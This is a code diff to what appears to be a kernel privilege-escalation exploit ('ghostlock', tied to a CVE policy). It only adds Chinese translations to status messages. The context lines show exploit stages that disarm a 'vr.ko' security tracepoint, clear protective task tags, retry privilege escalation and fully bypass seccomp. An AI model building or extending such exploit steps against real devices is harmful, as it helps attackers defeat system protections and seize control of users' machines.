@@ -153,9 +153,9 @@ namespace ghostlock::session::backend {
                 memory::WriteMode::Zero, 1);
             if (Cve2026_43499Policy::template attack_write<M>(
                     session, request, "W1c: vr sys_exit")) {
-                pr_success("vr.ko sys_exit tracepoint disarmed (funcs = NULL)\n");
+                pr_success("vr.ko sys_exit tracepoint disarmed (funcs = NULL) —— vr 已全局拆除\n");
             } else {
-                pr_warning("W1c write missed; relying on the per-task tag clear\n");
+                pr_warning("W1c write missed; relying on the per-task tag clear —— W1c 写入未命中，仅剩逐任务摘标防护\n");
             }
         }
 
@@ -251,7 +251,7 @@ namespace ghostlock::session::backend {
                     }
 
                     if (vr_ok) {
-                        pr_success("VR.ko per-task tags cleared\n");
+                        pr_success("VR.ko per-task tags cleared —— 任务标记已清除\n");
                     } else {
                         pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                     }
@@ -269,7 +269,7 @@ namespace ghostlock::session::backend {
                 write(pipes.cmd_write.get(), "X", 1);
                 pipes.cmd_write.reset();
                 pipes.uid_read.reset();
-                pr_warning("W2 failed after %u rounds\n",
+                pr_warning("W2 failed after %u rounds —— W2 提权重试全部失败\n",
                            g_exploit_session.profile.w2_attempts());
                 waitpid(pipes.child(), nullptr, WNOHANG);
                 return VictimRound::Failed;
@@ -377,7 +377,7 @@ namespace ghostlock::session::backend {
                 pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
                 return false;
             }
-            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+            pr_success("child seccomp fully bypassed (forked workers run filter-free) —— seccomp 已完全绕过\n");
             return true;
         }
 
